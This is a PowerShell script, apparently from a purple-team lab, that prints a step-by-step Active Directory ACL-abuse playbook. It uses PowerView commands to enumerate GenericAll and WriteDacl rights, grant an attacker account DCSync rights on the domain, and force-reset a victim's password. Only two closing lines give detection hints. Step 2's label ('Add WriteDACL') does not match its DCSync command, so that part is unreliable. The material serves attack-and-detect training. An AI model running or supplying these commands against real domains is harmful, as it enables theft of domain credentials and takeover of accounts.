<#
.SYNOPSIS
    ACL Abuse Attack (MITRE ATT&CK: T1222.001)

.DESCRIPTION
    Exploits excessive Active Directory permissions (WriteDACL, GenericAll, etc.)

.NOTES
    Author: Purple Team Lab
    MITRE ATT&CK: T1222.001 - File and Directory Permissions Modification
    Date: 2024-01-14

.EXAMPLE
    .\acl_abuse.ps1 -TargetUser victim -AttackerUser attacker
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$TargetUser,

    [Parameter(Mandatory=$true)]
    [string]$AttackerUser
)

Write-Host "===== ACL ABUSE ATTACK ====="
Write-Host "MITRE ATT&CK: T1222.001`n"

Write-Host "[*] Target: $TargetUser"
Write-Host "[*] Attacker: $AttackerUser`n"

# PowerView commands for ACL abuse
Write-Host "[*] 1. Enumerate permissions:"
Write-Host "Get-ObjectAcl -Identity $TargetUser | ? {`$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}`n"

Write-Host "[*] 2. Add WriteDACL permission:"
Write-Host "Add-DomainObjectAcl -TargetIdentity '$TargetUser' -PrincipalIdentity '$AttackerUser' -Rights DCSync`n"

Write-Host "[*] 3. Grant DCSync rights:"
Write-Host "Add-DomainObjectAcl -TargetIdentity 'DC=purpleteam,DC=lab' -PrincipalIdentity '$AttackerUser' -Rights DCSync`n"

Write-Host "[*] 4. Reset password (if GenericAll):"
Write-Host "Set-DomainUserPassword -Identity '$TargetUser' -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)`n"

Write-Host "[+] Detection: Event ID 5136 (Directory Service Changes)"
Write-Host "[+] Monitor ntSecurityDescriptor attribute modifications"
